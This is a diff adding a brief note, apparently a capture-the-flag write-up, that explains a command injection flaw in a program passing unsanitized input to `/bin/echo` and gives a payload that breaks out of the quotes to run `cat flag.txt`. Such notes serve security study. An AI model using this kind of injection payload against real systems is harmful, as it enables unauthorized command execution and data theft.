@@ -1,0 +1,6 @@
+unsanitized input. executes `/bin/echo "%s"`
+break out of the quotes, cat flag, and end the quotes
+
+payload:
+
+	asdf"; cat flag.txt; echo "a
